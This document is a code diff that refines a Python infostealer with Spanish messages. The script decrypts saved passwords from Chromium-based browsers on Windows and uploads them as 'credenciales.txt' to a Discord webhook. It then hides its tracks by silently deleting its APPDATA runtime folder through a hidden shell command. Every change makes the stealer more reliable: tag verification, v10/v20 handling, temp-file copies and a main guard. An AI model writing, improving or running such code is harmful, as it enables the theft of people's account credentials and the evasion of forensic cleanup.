@@ -33,50 +33,65 @@ def get_key(user_data_path):
             if os.path.exists(path):
                 with open(path, "r", encoding="utf-8") as f:
                     data = json.load(f)
-                key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
-                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-        except:
+                encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
+                if not encrypted_key_b64:
+                    continue
+                
+                decoded_key = base64.b64decode(encrypted_key_b64)
+                key_material = decoded_key[5:]
+                return win32crypt.CryptUnprotectData(key_material, None, None, None, 0)[1]
+        except Exception as e:
+            print(f"[-] Error obteniendo la clave maestra en {path}: {e}")
             continue
     return None
 
 def decrypt(enc, key):
     try:
-        iv = enc[3:15]
-        payload = enc[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(payload)[:-16].decode()
-    except:
+        if enc.startswith(b'v10') or enc.startswith(b'v20'):
+            iv = enc[3:15]
+            payload = enc[15:-16]
+            tag = enc[-16:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
+        else:
+            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+    except Exception as e:
         try:
-            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
-        except:
+            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+        except Exception:
             return ""
 
 def extract_from_db(db_path, key, creds, browser_name):
     if not os.path.exists(db_path):
         return
 
-    temp = "temp_db.db"
+    temp_fd, temp_path = tempfile.mkstemp()
+    os.close(temp_fd)
+    
     try:
-        shutil.copyfile(db_path, temp)
-    except:
+        shutil.copyfile(db_path, temp_path)
+    except Exception as e:
+        print(f"[-] No se pudo copiar la base de datos de {browser_name} (posiblemente esté abierta): {e}")
+        if os.path.exists(temp_path):
+            os.remove(temp_path)
         return
     
     try:
-        conn = sqlite3.connect(temp)
+        conn = sqlite3.connect(temp_path)
         cur = conn.cursor()
         cur.execute("SELECT origin_url, username_value, password_value FROM logins")
         
         for url, user, pwd_enc in cur.fetchall():
-            if user:
+            if user and pwd_enc:
                 pwd = decrypt(pwd_enc, key)
                 creds.append(f"[{browser_name}] URL: {url} | User: {user} | Pass: {pwd}")
         conn.close()
-    except:
-        pass
+    except Exception as e:
+        print(f"[-] Error al consultar la base de datos SQLite de {browser_name}: {e}")
     finally:
-        if os.path.exists(temp):
+        if os.path.exists(temp_path):
             try:
-                os.remove(temp)
+                os.remove(temp_path)
             except:
                 pass
 
@@ -90,6 +105,7 @@ def get_all_creds():
             
         key = get_key(user_data_path)
         if not key:
+            print(f"[-] No se pudo obtener la llave de cifrado para {browser_name}")
             continue
             
         target_dirs = [user_data_path]
@@ -98,7 +114,7 @@ def get_all_creds():
                 full_item = os.path.join(user_data_path, item)
                 if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
                     target_dirs.append(full_item)
-        except:
+        except Exception:
             pass
             
         for d in target_dirs:
@@ -107,47 +123,41 @@ def get_all_creds():
             
     return creds
 
-accounts = get_all_creds()
+if __name__ == "__main__":
+    accounts = get_all_creds()
 
-if accounts:
-    file_name = "credenciales.txt"
+    if accounts and WEBHOOK_URL != "TU_WEBHOOK_DE_DISCORD_AQUI":
+        file_name = "credenciales.txt"
+        try:
+            with open(file_name, "w", encoding="utf-8") as f:
+                f.write("\n".join(accounts))
+            
+            with open(file_name, "rb") as f:
+                requests.post(
+                    WEBHOOK_URL,
+                    data={"content": f"**Credenciales totales extraídas: {len(accounts)}**"},
+                    files={"file": (file_name, f, "text/plain")}
+                )
+        except Exception as e:
+            print(f"[-] Error al enviar el reporte: {e}")
+        finally:
+            if os.path.exists(file_name):
+                try:
+                    os.remove(file_name)
+                except:
+                    pass
+
     try:
-        with open(file_name, "w", encoding="utf-8") as f:
-            f.write("\n".join(accounts))
-        
-        with open(file_name, "rb") as f:
-            requests.post(
-                WEBHOOK_URL,
-                data={"content": f"**Credenciales totales extraídas: {len(accounts)}**"},
-                files={"file": (file_name, f, "text/plain")}
-            )
-    except:
+        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = subprocess.SW_HIDE
+
+        subprocess.Popen(
+            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
+            shell=True,
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    except Exception:
         pass
-    finally:
-        if os.path.exists(file_name):
-            try:
-                os.remove(file_name)
-            except:
-                pass
-
-import os
-import sys
-import subprocess
-
-try:
-    ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
-    
-    startupinfo = subprocess.STARTUPINFO()
-    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    startupinfo.wShowWindow = subprocess.SW_HIDE
-
-    subprocess.Popen(
-        f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
-        shell=True,
-        startupinfo=startupinfo,
-        creationflags=subprocess.CREATE_NO_WINDOW
-    )
-except Exception:
-    pass
-
-sys.exit(0)
